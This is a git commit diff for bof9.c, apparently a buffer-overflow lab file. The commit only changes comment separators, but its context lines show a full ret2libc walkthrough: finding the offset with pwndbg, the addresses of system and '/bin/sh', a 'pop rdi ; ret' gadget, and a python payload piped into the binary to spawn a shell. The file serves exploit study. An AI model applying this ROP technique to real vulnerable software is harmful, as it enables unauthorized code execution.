4e80cbcd616f26c87c8855f8f7a001419bd58c96
TEST <test@test.t>
2019-07-17 15:50:25 +0900

    split bar

--- bof9.c
+++ bof9.c
@@ -19,15 +19,15 @@
 //              rdi : 0x7fffffffe610
 //         pwndbg> p/d 0x7fffffffe628 - 0x7fffffffe610
 //              $2 = 24
-////////////////////////////////////////////////////////////
+// --------------------------------------------------------
 // ###### FIND address of system FUNCTION
 //         pwndbg> p system
 //              $1 = ... 0x7ffff7a52390 <__libc_system>
-////////////////////////////////////////////////////////////
+// --------------------------------------------------------
 // ###### FIND address of "/bin/sh" STRING
 //         pwndbg> search /bin/sh
 //              libc-2.23.so    0x7ffff7b99d57 /* '/bin/sh' */
-////////////////////////////////////////////////////////////
+// --------------------------------------------------------
 // ###### FIND address of "pop rdi ; ret" gadget
 //         $ ldd bof9           # CHECK library used by bof9
 //         $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
@@ -37,7 +37,7 @@
 //              0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
 //         pwndbg> p/x 0x0000000000021102 + 0x7ffff7a0d000
 //              $1 = 0x7ffff7a2e102
-////////////////////////////////////////////////////////////
+// --------------------------------------------------------
 // ###### MAKE payload!!!
 // payload : [dummy byte (24)] + ["pop rdi ; ret" (8)] + ["/bin/sh" (8)] + [system (8)]
 //         $ (python -c "print 'a'*24+'\x02\xe1\xa2\xf7\xff\x7f\x00\x00'+'\x57\x9d\xb9\xf7\xff\x7f\x00\x00'+'\x90\x23\xa5\xf7\xff\x7f\x00\x00'";cat) | ./bof9
